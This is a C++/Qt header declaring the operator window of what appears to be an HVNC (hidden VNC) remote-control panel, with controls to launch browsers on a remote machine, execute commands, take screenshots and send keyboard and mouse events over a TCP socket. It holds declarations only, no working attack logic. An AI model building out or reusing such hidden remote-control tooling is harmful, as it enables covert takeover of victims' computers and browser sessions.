#ifndef HVNC_MAIN_VIEW_H
#define HVNC_MAIN_VIEW_H

#include "hvncmain.h"
#include <QHBoxLayout>
#include <QVBoxLayout>
#include <QLabel>
#include <QTcpSocket>
#include <QHostAddress>
#include <QTcpServer>
#include <QPushButton>
#include <QLineEdit>
#include <QCheckBox>
#include <QMap>
//template <class T>
class hvnc_main_view : public QWidget
{

    Q_OBJECT
    void layout_init(QTcpSocket *tcpSocket[1]);
    QWidget *status_widget;
    QWidget* centralWidget = new QWidget();
    QCheckBox *checkbox_Control, *checkbox_Keyboard, *commands;

    QPushButton *button_ScreenShot, *button_Disconnect, *button_FireFox, *button_Chrome, *button_Edge,
    *button_InternetExplorer, *button_Opera, *button_Execute;
    QLineEdit * textEdit;
    QGridLayout *layout;
    void connections();
    QTcpSocket  *tcpSocket;
    //QMap<int, int> a;
    hvncmain *vncmain;
public:

    //static void send_command(Commands command);
    //static void send_command(QTcpSocket  *tcpSocket, int type);

    static void send_event(QTcpSocket *tcpSocket, int msg, WPARAM wParam, LPARAM lpParam);
    hvnc_main_view(QWidget *parent, QTcpSocket  *tcpSocket[1]);
protected:

private slots:

    void commands_button(int state);


    void execute_button();
    void chrome_button();
    void disconnect_button();
    void edge_button();
    void firefox_button();
    void internet_explorer_button();
    void opera_button();
    void screenshot_button();
};



#endif // HVNC_MAIN_VIEW_H
